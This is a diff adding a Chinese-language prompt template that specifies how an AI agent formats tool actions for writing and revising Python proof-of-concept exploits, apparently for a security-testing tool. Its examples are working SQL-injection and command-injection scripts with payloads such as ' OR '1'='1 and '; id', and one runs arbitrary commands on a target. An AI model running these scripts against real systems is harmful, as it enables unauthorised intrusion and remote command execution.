@@ -1,0 +1,261 @@
+## Python POC 代码生成输出格式示例
+
+你的工作流程必须遵循以下协议：
+
+*   **初始编码**: 使用 `write_python_poc` 生成初始 Python POC 代码。
+*   **迭代修改**: 后续所有修改都应使用 `modify_python_poc`。
+*   **语法验证**: 每次生成或修改代码后，系统会自动进行 Python 语法检查。
+
+### 诊断优先原则 (Diagnose-Before-Treat Protocol)
+
+1.  在 `modify_python_poc` 后，仔细分析返回的 `syntax error`。
+2.  如果有语法错误，你**必须立即修复**，不要猜测。
+3.  只有在代码语法完全正确后，才能退出专注模式。
+
+**禁止猜测**: 严禁在不理解错误根源的情况下，连续使用 `modify_python_poc` 进行试探性修复。
+
+---
+
+### 正确示例 1: `write_python_poc` 动作（创建新代码）
+
+```json
+{"@action": "write_python_poc", "human_readable_thought": "根据漏洞信息创建一个SQL注入POC"}
+```
+
+<|GEN_PYTHON_POC_{{ .Nonce }}|>
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+SQL Injection POC
+Target: Example vulnerable endpoint
+"""
+
+import requests
+import sys
+from urllib.parse import urljoin
+
+class SQLInjectionPOC:
+    def __init__(self, target_url, timeout=10):
+        self.target_url = target_url
+        self.timeout = timeout
+        self.session = requests.Session()
+    
+    def check_vulnerability(self):
+        """检测SQL注入漏洞是否存在"""
+        payload = "' OR '1'='1"
+        try:
+            resp = self.session.get(
+                urljoin(self.target_url, f"/search?q={payload}"),
+                timeout=self.timeout
+            )
+            if "error in your SQL syntax" in resp.text.lower():
+                return True, "SQL injection vulnerability detected!"
+            return False, "Target appears not vulnerable"
+        except Exception as e:
+            return False, f"Error: {str(e)}"
+    
+    def exploit(self, payload):
+        """利用SQL注入漏洞"""
+        try:
+            resp = self.session.get(
+                urljoin(self.target_url, f"/search?q={payload}"),
+                timeout=self.timeout
+            )
+            return resp.text
+        except Exception as e:
+            return f"Exploit failed: {str(e)}"
+
+def main():
+    if len(sys.argv) < 2:
+        print("Usage: python3 poc.py <target_url>")
+        sys.exit(1)
+    
+    target_url = sys.argv[1]
+    poc = SQLInjectionPOC(target_url)
+    
+    print(f"[*] Testing target: {target_url}")
+    is_vuln, msg = poc.check_vulnerability()
+    print(f"[{'+'if is_vuln else '-'}] {msg}")
+
+if __name__ == "__main__":
+    main()
+<|GEN_PYTHON_POC_END_{{ .Nonce }}|>
+
+### 正确示例 2: `modify_python_poc` 动作（修改现有代码）
+
+```json
+{"@action": "modify_python_poc", "modify_start_line": 18, "modify_end_line": 25, "modify_code_reason": "添加更多的payload测试用例"}
+```
+
+<|GEN_PYTHON_POC_{{ .Nonce }}|>
+    def check_vulnerability(self):
+        """检测SQL注入漏洞是否存在"""
+        payloads = [
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "1' AND '1'='1",
+            "1 UNION SELECT NULL--"
+        ]
+        for payload in payloads:
+            try:
+                resp = self.session.get(
+                    urljoin(self.target_url, f"/search?q={payload}"),
+                    timeout=self.timeout
+                )
+                if "error in your SQL syntax" in resp.text.lower():
+                    return True, f"SQL injection detected with payload: {payload}"
+            except Exception as e:
+                continue
+        return False, "Target appears not vulnerable"
+<|GEN_PYTHON_POC_END_{{ .Nonce }}|>
+
+---
+
+## 📋 Action 类型总结
+
+### 需要 `<|GEN_PYTHON_POC...|>` 标签的 Actions：
+- ✅ `write_python_poc` - 创建新的 Python POC 文件
+- ✅ `modify_python_poc` - 修改现有 Python POC 代码片段
+
+### 不需要 `<|GEN_PYTHON_POC...|>` 标签的 Actions：
+- ❌ `directly_answer` - 直接回答（无需生成代码）
+
+**记忆口诀**: 只有需要你"生成或提供代码片段"的 actions 才需要 `<|GEN_PYTHON_POC...|>` 标签！
+
+---
+
+## ❌ 常见错误示例
+
+### 错误示例 1：使用 markdown 代码块（绝对禁止！）
+
+```json
+{"@action": "write_python_poc", "human_readable_thought": "创建POC"}
+```
+
+```python
+#!/usr/bin/env python3
+import requests
+# 这是错误的！
+```
+
+⚠️ **这种格式是错误的！必须使用 `<|GEN_PYTHON_POC_xxx|>` 标签，不能使用 markdown 代码块！**
+
+### 错误示例 2：包含行号前缀（绝对禁止！）
+
+```json
+{"@action": "modify_python_poc", "modify_start_line": 18, "modify_end_line": 25}
+```
+
+<|GEN_PYTHON_POC_{{ .Nonce }}|>
+18 |     def check_vulnerability(self):
+19 |         """检测漏洞"""
+<|GEN_PYTHON_POC_END_{{ .Nonce }}|>
+
+⚠️ **这种格式是错误的！包含行号会导致语法解析失败！**
+
+---
+
+## ✅ 完整工作流示例
+
+### 示例：创建 RCE 漏洞 POC
+
+**步骤1：创建初始代码**
+```json
+{"@action": "write_python_poc", "human_readable_thought": "根据漏洞分析，创建一个RCE漏洞的POC"}
+```
+
+<|GEN_PYTHON_POC_{{ .Nonce }}|>
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Remote Code Execution POC
+Vulnerability: Command Injection in /api/ping endpoint
+"""
+
+import requests
+import sys
+
+class RCEExploit:
+    def __init__(self, target_url):
+        self.target_url = target_url
+        self.session = requests.Session()
+    
+    def check(self):
+        """检测RCE漏洞"""
+        payload = "; id"
+        resp = self.session.post(
+            f"{self.target_url}/api/ping",
+            data={"host": f"127.0.0.1{payload}"}
+        )
+        if "uid=" in resp.text:
+            return True, resp.text
+        return False, "Not vulnerable"
+    
+    def exploit(self, cmd):
+        """执行任意命令"""
+        payload = f"; {cmd}"
+        resp = self.session.post(
+            f"{self.target_url}/api/ping",
+            data={"host": f"127.0.0.1{payload}"}
+        )
+        return resp.text
+
+def main():
+    if len(sys.argv) < 2:
+        print("Usage: python3 rce_poc.py <target_url> [command]")
+        sys.exit(1)
+    
+    target = sys.argv[1]
+    cmd = sys.argv[2] if len(sys.argv) > 2 else "id"
+    
+    poc = RCEExploit(target)
+    print(f"[*] Target: {target}")
+    
+    is_vuln, result = poc.check()
+    if is_vuln:
+        print(f"[+] Vulnerable! Executing command: {cmd}")
+        output = poc.exploit(cmd)
+        print(output)
+    else:
+        print("[-] Target not vulnerable")
+
+if __name__ == "__main__":
+    main()
+<|GEN_PYTHON_POC_END_{{ .Nonce }}|>
+
+**步骤2：如果语法检查有错误，修复它**
+```json
+{"@action": "modify_python_poc", "modify_start_line": 15, "modify_end_line": 20, "modify_code_reason": "修复语法错误，添加异常处理"}
+```
+
+<|GEN_PYTHON_POC_{{ .Nonce }}|>
+    def check(self):
+        """检测RCE漏洞"""
+        payload = "; id"
+        try:
+            resp = self.session.post(
+                f"{self.target_url}/api/ping",
+                data={"host": f"127.0.0.1{payload}"},
+                timeout=10
+            )
+            if "uid=" in resp.text:
+                return True, resp.text
+            return False, "Not vulnerable"
+        except requests.RequestException as e:
+            return False, f"Request failed: {e}"
+<|GEN_PYTHON_POC_END_{{ .Nonce }}|>
+
+**步骤3：确认代码完成**
+```json
+{"@action": "directly_answer", "human_readable_thought": "Python POC代码已生成完成，语法检查通过，可以直接使用"}
+```
+
+---
+
+## 重要提醒
+
+1. **必须使用正确的标签格式**: `<|GEN_PYTHON_POC_xxx|>` 和 `<|GEN_PYTHON_POC_END_xxx|>`
+2. **禁止使用 markdown 代码块**: 不要用 \`\`\`python ... \`\`\` 格式
+3. **代码不要包含行号**: 直接写代码，不要在前面加行号
+4. **确保语法正确**: 系统会自动检查 Python 语法，有错误必须修复
+5. **完整的代码结构**: 包含必要的导入、类定义、main 函数等
